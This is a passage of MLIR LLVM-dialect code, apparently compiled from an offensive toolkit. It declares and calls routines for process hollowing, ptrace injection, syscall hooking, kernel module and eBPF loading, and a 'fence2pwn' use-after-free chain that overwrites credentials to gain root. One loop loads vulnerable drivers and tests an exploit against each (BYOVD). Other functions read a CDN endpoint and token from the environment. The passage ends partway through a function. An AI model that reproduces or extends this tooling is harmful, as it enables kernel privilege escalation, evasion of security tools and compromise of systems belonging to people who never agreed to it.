  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_load(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_unload(!llvm.ptr) -> i1
  llvm.func @jocky_module_has_symbol(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_module_base(!llvm.ptr) -> i64
  llvm.func @jocky_module_resolve_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_process_hollow_linux(i32, !llvm.ptr, i64) -> i1
  llvm.func @jocky_process_ptrace_attach(i32) -> i32
  llvm.func @jocky_process_ptrace_detach(i32) -> i32
  llvm.func @jocky_process_get_maps(i32, !llvm.ptr, i64) -> i32
  llvm.func @jocky_fence2pwn_detect_kfence() -> i32
  llvm.func @jocky_fence2pwn_get_pool_info(!llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_trigger_allocations(i64, i32) -> i32
  llvm.func @jocky_fence2pwn_exploit_uaf(i32, i32, !llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_manipulate_creds(i32, i32) -> i32
  llvm.func @jocky_fence2pwn_allocate_cred_objects(i32) -> i32
  llvm.func @jocky_fence2pwn_write_cred(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_fence2pwn_trigger_reclamation() -> i32
  llvm.func @jocky_fence2pwn_elevate_to_root() -> i32
  llvm.func @jocky_fence2pwn_find_uaf_primitive() -> i32
  llvm.func @jocky_ebpf_load(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_ebpf_attach(i32, i32, i32) -> i32
  llvm.func @jocky_ebpf_run(i32, !llvm.ptr, i32) -> i64
  llvm.func @jocky_lkm_load(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_lkm_unload(!llvm.ptr) -> i32
  llvm.func @jocky_lkm_get_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_syscall_hook(i32, !llvm.ptr) -> i32
  llvm.func @jocky_syscall_unhook(i32) -> i32
  llvm.func @jocky_syscall_trace(i32) -> i32
  llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
  llvm.func @get_cdn_endpoint() -> !llvm.ptr {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %5 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %6 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %7 = llvm.call @jocky_getenv(%6) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %7, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %8 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %9 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %10 = llvm.icmp "eq" %8, %9 : !llvm.ptr
    llvm.cond_br %10, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %11 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.return %11 : !llvm.ptr
  ^bb2:  // pred: ^bb0
    %12 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.return %12 : !llvm.ptr
  }
  llvm.func @get_cdn_token() -> !llvm.ptr {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.3" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.4" : !llvm.ptr
    %5 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %6 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %7 = llvm.call @jocky_getenv(%6) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %7, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %8 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %9 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %10 = llvm.icmp "eq" %8, %9 : !llvm.ptr
    llvm.cond_br %10, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %11 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.return %11 : !llvm.ptr
  ^bb2:  // pred: ^bb0
    %12 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.return %12 : !llvm.ptr
  }
  llvm.func @get_model_path() -> !llvm.ptr {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.5" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %5 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %6 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %7 = llvm.call @jocky_getenv(%6) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %7, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %8 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %9 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %10 = llvm.icmp "eq" %8, %9 : !llvm.ptr
    llvm.cond_br %10, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %11 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.return %11 : !llvm.ptr
  ^bb2:  // pred: ^bb0
    %12 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.return %12 : !llvm.ptr
  }
  llvm.func @log_operation(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %2 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %2 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %3 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg1, %3 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %4 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg2, %4 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %5 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg3, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %6 = llvm.load %2 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %7 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %8 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %9 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @audit_log(%6, %7, %8, %9) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %10 = llvm.load %1 {alignment = 4 : i64} : !llvm.ptr -> i32
    %11 = llvm.add %10, %0 : i32
    llvm.store %11, %1 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.return
  }
  llvm.func @initialize_systems() {
    %0 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.8" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.9" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.10" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.11" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %8 = llvm.mlir.constant(1000 : i32) : i32
    %9 = llvm.mlir.constant(true) : i1
    %10 = llvm.mlir.addressof @audit_log_initialized : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.13" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.14" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.17" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %17 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    %18 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.mlir.addressof @audit_init : !llvm.ptr
    %25 = llvm.call %24(%8) : !llvm.ptr, (i32) -> i1
    llvm.store %9, %10 {alignment = 1 : i64} : i1, !llvm.ptr
    %26 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %27 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %28 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %29 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @log_operation(%26, %27, %28, %29) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %30 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    %31 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @load_byovd_drivers() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.19" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.20" : !llvm.ptr
    %4 = llvm.mlir.addressof @DRIVER_CHAIN : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %6 = llvm.mlir.constant(0 : i64) : i64
    %7 = llvm.mlir.constant(2 : i32) : i32
    %8 = llvm.mlir.addressof @".str.21" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.22" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.23" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.35" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.28" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.36" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.34" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.24" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.25" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.26" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.31" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.32" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.33" : !llvm.ptr
    %21 = llvm.mlir.constant(1 : i64) : i64
    %22 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %23 = llvm.mlir.addressof @loaded_drivers : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.29" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.30" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.39" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.37" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.38" : !llvm.ptr
    %29 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %36 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %37 = llvm.call @array_len(%36) : (!llvm.ptr) -> i64
    %38 = llvm.call @string(%37) : (i64) -> !llvm.ptr
    %39 = llvm.call @jocky_str_concat(%35, %38) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    %40 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %41 {alignment = 4 : i64} : i32, !llvm.ptr
    %42 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.call @array_len(%42) : (!llvm.ptr) -> i64
    %44 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %6, %44 {alignment = 4 : i64} : i64, !llvm.ptr
    %45 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb9
    %46 = llvm.load %44 {alignment = 4 : i64} : !llvm.ptr -> i64
    %47 = llvm.icmp "slt" %46, %43 : i64
    llvm.cond_br %47, ^bb2, ^bb10
  ^bb2:  // pred: ^bb1
    %48 = llvm.bitcast %42 : !llvm.ptr to !llvm.ptr
    %49 = llvm.getelementptr %48[%46] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %50 = llvm.load %49 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %50, %45 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %51 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %52 = llvm.bitcast %51 : !llvm.ptr to !llvm.ptr
    %53 = llvm.getelementptr %52[%2] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %54 = llvm.load %53 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %54, %29 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %55 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %56 = llvm.bitcast %55 : !llvm.ptr to !llvm.ptr
    %57 = llvm.getelementptr %56[%0] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %58 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %58, %30 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %59 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %60 = llvm.bitcast %59 : !llvm.ptr to !llvm.ptr
    %61 = llvm.getelementptr %60[%7] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %62 = llvm.load %61 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %62, %31 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %63 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    %64 = llvm.load %41 {alignment = 4 : i64} : !llvm.ptr -> i32
    %65 = llvm.add %64, %0 : i32
    %66 = llvm.sext %65 : i32 to i64
    %67 = llvm.call @string(%66) : (i64) -> !llvm.ptr
    %68 = llvm.call @jocky_str_concat(%63, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %69 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %70 = llvm.call @jocky_str_concat(%68, %69) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %71 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %72 = llvm.call @array_len(%71) : (!llvm.ptr) -> i64
    %73 = llvm.call @string(%72) : (i64) -> !llvm.ptr
    %74 = llvm.call @jocky_str_concat(%70, %73) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %75 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<3 x i8>
    %76 = llvm.call @jocky_str_concat(%74, %75) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %77 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %78 = llvm.call @jocky_str_concat(%76, %77) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%78) : (!llvm.ptr) -> ()
    %79 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.mlir.addressof @byovd_load_driver : !llvm.ptr
    %81 = llvm.call %80(%79) : !llvm.ptr, (!llvm.ptr) -> i32
    llvm.store %81, %32 {alignment = 4 : i64} : i32, !llvm.ptr
    %82 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %83 = llvm.icmp "sgt" %82, %2 : i32
    llvm.cond_br %83, ^bb3, ^bb7
  ^bb3:  // pred: ^bb2
    %84 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %85 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %86 = llvm.sext %85 : i32 to i64
    %87 = llvm.call @string(%86) : (i64) -> !llvm.ptr
    %88 = llvm.call @jocky_str_concat(%84, %87) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%88) : (!llvm.ptr) -> ()
    %89 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %90 = llvm.load %30 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %91 = llvm.call @jocky_str_concat(%89, %90) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%91) : (!llvm.ptr) -> ()
    %92 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %93 = llvm.load %31 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %94 = llvm.ptrtoint %93 : !llvm.ptr to i64
    %95 = llvm.call @string(%94) : (i64) -> !llvm.ptr
    %96 = llvm.call @jocky_str_concat(%92, %95) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%96) : (!llvm.ptr) -> ()
    %97 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %98 = llvm.mlir.addressof @byovd_test_exploit : !llvm.ptr
    %99 = llvm.call %98(%97) : !llvm.ptr, (i32) -> i32
    llvm.store %99, %33 {alignment = 4 : i64} : i32, !llvm.ptr
    %100 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i32
    %101 = llvm.icmp "eq" %100, %2 : i32
    llvm.cond_br %101, ^bb4, ^bb5
  ^bb4:  // pred: ^bb3
    %102 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<52 x i8>
    llvm.call @println(%102) : (!llvm.ptr) -> ()
    %103 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %104 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %105 = llvm.call @array_append(%103, %104) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %105, %23 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %106 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %107 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %108 = llvm.load %30 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %109 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    llvm.call @log_operation(%106, %107, %108, %109) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %110 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%110) : (!llvm.ptr) -> ()
    %111 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    %112 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %113 = llvm.call @jocky_str_concat(%111, %112) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%113) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb5:  // pred: ^bb3
    %114 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<50 x i8>
    llvm.call @println(%114) : (!llvm.ptr) -> ()
    %115 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %116 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %117 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %118 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @log_operation(%115, %116, %117, %118) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // pred: ^bb5
    llvm.br ^bb8
  ^bb7:  // pred: ^bb2
    %119 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%119) : (!llvm.ptr) -> ()
    %120 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %121 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %122 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %123 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @log_operation(%120, %121, %122, %123) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %124 = llvm.load %41 {alignment = 4 : i64} : !llvm.ptr -> i32
    %125 = llvm.add %124, %0 : i32
    llvm.store %125, %41 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb9
  ^bb9:  // pred: ^bb8
    %126 = llvm.add %46, %21 : i64
    llvm.store %126, %44 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb10:  // 2 preds: ^bb1, ^bb4
    %127 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %128 = llvm.call @array_len(%127) : (!llvm.ptr) -> i64
    %129 = llvm.sext %2 : i32 to i64
    %130 = llvm.icmp "sgt" %128, %129 : i64
    llvm.cond_br %130, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %131 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%131) : (!llvm.ptr) -> ()
    %132 = llvm.getelementptr %27[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %133 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %134 = llvm.call @array_len(%133) : (!llvm.ptr) -> i64
    %135 = llvm.call @string(%134) : (i64) -> !llvm.ptr
    %136 = llvm.call @jocky_str_concat(%132, %135) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %137 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %138 = llvm.call @jocky_str_concat(%136, %137) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%138) : (!llvm.ptr) -> ()
    llvm.br ^bb13
  ^bb12:  // pred: ^bb10
    %139 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%139) : (!llvm.ptr) -> ()
    %140 = llvm.getelementptr %26[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<58 x i8>
    llvm.call @println(%140) : (!llvm.ptr) -> ()
    llvm.br ^bb13
  ^bb13:  // 2 preds: ^bb11, ^bb12
    %141 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%141) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @assess_threat_environment() {
    %0 = llvm.mlir.addressof @".str.40" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.41" : !llvm.ptr
    %3 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.42" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.43" : !llvm.ptr
    %7 = llvm.mlir.constant(8.000000e-01 : f64) : f64
    %8 = llvm.mlir.constant(5.000000e-01 : f64) : f64
    %9 = llvm.mlir.addressof @".str.51" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.45" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.46" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.47" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.52" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.49" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.50" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.44" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.48" : !llvm.ptr
    %18 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.mlir.addressof @ai_init : !llvm.ptr
    %21 = llvm.call %20() : !llvm.ptr, () -> i32
    %22 = llvm.mlir.addressof @ai_collect_telemetry : !llvm.ptr
    %23 = llvm.call %22() : !llvm.ptr, () -> !llvm.ptr
    %24 = llvm.call @ai_score_threat() : () -> f64
    llvm.store %24, %3 {alignment = 8 : i64} : f64, !llvm.ptr
    %25 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
